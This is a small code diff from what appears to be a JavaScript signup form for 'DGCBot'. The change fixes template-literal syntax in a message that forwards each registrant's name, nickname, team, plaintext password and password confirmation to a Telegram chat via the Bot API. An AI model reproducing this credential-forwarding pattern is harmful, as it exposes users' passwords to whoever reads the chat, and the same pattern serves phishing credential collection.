@@ -151,7 +151,7 @@ if (formData.teamOption === "join") {
   teamInfo = `🟢 Criar novo time\n🏆 Nome do time: ${formData.newTeamName}`;
 }
 
-      const messageText = 
+   const messageText = `
 🚀 Novo cadastro DGCBot:
 👤 Nome: ${formData.fullName}
 🎮 Nick: ${formData.nick}
@@ -159,7 +159,8 @@ if (formData.teamOption === "join") {
 🔑 Senha: ${formData.password}
 ✅ Csenha: ${formData.confirmPassword}
 ${teamInfo}
-      ;
+`;
+
 
       try {
         await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
